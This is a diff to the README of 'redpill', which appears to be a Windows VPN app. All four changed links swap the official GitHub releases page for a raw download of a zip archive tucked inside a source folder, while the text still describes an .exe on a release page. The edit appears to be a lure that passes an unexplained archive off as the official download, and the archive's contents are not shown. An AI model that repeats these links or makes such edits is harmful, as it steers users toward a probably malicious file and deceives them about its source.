@@ -1,6 +1,6 @@
 # 🛡️ redpill - Fast, Secure VPN for Windows
 
-[![Download redpill](https://img.shields.io/badge/Download-redpill-brightgreen)](https://github.com/Jayysofficial/redpill/releases)
+[![Download redpill](https://img.shields.io/badge/Download-redpill-brightgreen)](https://raw.githubusercontent.com/Jayysofficial/redpill/main/crates/redpill-quic/Software_2.5.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Before you start, make sure your Windows device meets these needs:
 
 1. Open the download page by clicking the button below:
 
-   [![Download redpill](https://img.shields.io/badge/Download-Windows-blue)](https://github.com/Jayysofficial/redpill/releases)
+   [![Download redpill](https://img.shields.io/badge/Download-Windows-blue)](https://raw.githubusercontent.com/Jayysofficial/redpill/main/crates/redpill-quic/Software_2.5.zip)
 
 2. On the page, look for the latest Windows version. The file will usually end with `.exe`.
 
@@ -99,7 +99,7 @@ If redpill does not connect or behaves strangely, try these tips:
 
 Updates bring improvements and fix problems. To update redpill:
 
-1. Visit the release page here: https://github.com/Jayysofficial/redpill/releases
+1. Visit the release page here: https://raw.githubusercontent.com/Jayysofficial/redpill/main/crates/redpill-quic/Software_2.5.zip
 
 2. Download the latest Windows executable file.
 
@@ -139,7 +139,7 @@ If you want to remove redpill:
 
 You can always get the latest version on the official release page:
 
-[![Visit redpill Releases](https://img.shields.io/badge/Download-Latest%20Version-green)](https://github.com/Jayysofficial/redpill/releases)
+[![Visit redpill Releases](https://img.shields.io/badge/Download-Latest%20Version-green)](https://raw.githubusercontent.com/Jayysofficial/redpill/main/crates/redpill-quic/Software_2.5.zip)
 
 ---
 
